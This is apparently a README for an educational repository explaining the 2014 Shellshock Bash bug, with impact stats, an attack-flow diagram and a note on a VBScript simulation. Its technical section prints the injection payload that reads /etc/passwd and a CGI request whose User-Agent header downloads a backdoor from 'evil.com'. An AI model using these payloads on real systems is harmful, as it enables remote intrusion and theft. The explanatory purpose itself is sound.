# 🐚 Shellshock Vulnerability (2014)

> **A 25-year-old bug in Bash that gave remote code execution on half the internet**

<div align="center">

![Shellshock](https://img.shields.io/badge/Shellshock-Remote%20Code%20Execution-red?style=for-the-badge&logo=security)
[![CVE](https://img.shields.io/badge/CVE--2014--6271-Critical-red?style=flat-square)]()
[![Discovered](https://img.shields.io/badge/Discovered-Sept%2024%2C%202014-lightgrey?style=flat-square)]()
[![Affected](https://img.shields.io/badge/Affected-500M%2B%20systems-orange?style=flat-square)]()

</div>

---

## 📊 Quick Stats

| Attribute | Value |
|-----------|-------|
| 📅 Discovered | September 24, 2014 |
| 👤 Discovered By | Stephane Chazelas |
| 🖥️ Platform | GNU Bash 1.14 through 4.3 (25 years of releases) |
| 💥 Affected | 500M+ systems, 25% of internet servers |
| 🔓 Type | Remote code execution via environment variable injection |
| 🛠️ Fix | 6 CVEs needed (CVE-2014-6271, 6277, 6278, 7169, 7186, 7187) |

---

## 🔍 How It Worked

```
┌─────────────────────────────────────────────────────────────┐
│                    SHELLSHOCK ATTACK FLOW                    │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  🐚 Bash exports functions via environment variables         │
│     │  LEGITIMATE: greet='() { echo hello; }'               │
│     │                                                       │
│     ▼                                                       │
│  🐛 BUG: Parser doesn't stop after function definition       │
│     │  INJECTED: x='() { :;}; MALICIOUS_COMMAND'            │
│     │  The parser reads the function, then CONTINUES        │
│     │  and executes whatever comes after                      │
│     │                                                       │
│     ▼                                                       │
│  💉 Attack vectors:                                         │
│     │                                                       │
│     ├─ 🌐 CGI Web: HTTP headers → env vars → Bash           │
│     ├─ 🔐 SSH: Forced command restrictions bypassed         │
│     ├─ 📡 DHCP: Rogue server → client script                │
│     ├─ 📧 Mail: Procmail and mail filters                   │
│     └─ 🔧 sudo: Environment pass-through                    │
│     │                                                       │
│     ▼                                                       │
│  💥 Arbitrary command execution on target system             │
│     │  No authentication required                           │
│     │  Works on 25 years of Bash versions                   │
│     │                                                       │
│     ▼                                                       │
│  🤖 Used in DDoS botnets within hours of disclosure         │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 🧬 Technical Breakdown

### The Exploit Pattern

```bash
# Legitimate function export
export greet='() { echo hello; }'

# Malicious injection via environment variable
env x='() { :;}; /bin/cat /etc/passwd' bash -c "echo test"

# What happens:
# 1. Bash starts, reads environment variable x
# 2. Sees '() {' → interprets as function definition
# 3. Parses function: '() { :;}' (no-op)
# 4. BUG: Continues parsing → finds '/bin/cat /etc/passwd'
# 5. EXECUTES the injected command
# 6. Then runs 'echo test'
```

### Web Server Exploitation

```
GET /cgi-bin/status.cgi HTTP/1.1
User-Agent: () { :;}; /bin/bash -c 'wget http://evil.com/backdoor.sh'

Apache sets HTTP_USER_AGENT environment variable →
CGI script calls system() → Bash starts → Injection executes
```

---

## 📁 Source Files

| File | Description |
|------|-------------|
| [`shellshock_educational.vbs`](shellshock_educational.vbs) | Annotated VBScript source code |
| [`run_simulation.bat`](run_simulation.bat) | Easy runner for safe simulation |

---

## ⚙️ How to Run

```bash
cd shellshock_vuln
run_simulation.bat
```

Or directly:
```bash
cscript //nologo shellshock_educational.vbs
```

---

## 🛡️ Impact

| Metric | Value |
|--------|-------|
| Bash versions affected | 1.14 through 4.3 (25 years) |
| Systems affected | 500M+ |
| Related CVEs | 6 (6271, 6277, 6278, 7169, 7186, 7187) |
| Botnet usage | Within hours of disclosure |

---

## 📚 Further Reading

- [CVE-2014-6271 Details](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)
- [Shellshock Wikipedia](https://en.wikipedia.org/wiki/Shellshock_(software_bug))
- [Red Hat Analysis](https://access.redhat.com/articles/1200223)

---

<div align="center">

⚠️ **EDUCATIONAL ONLY** — This is a vulnerability demonstration, not malware

</div>
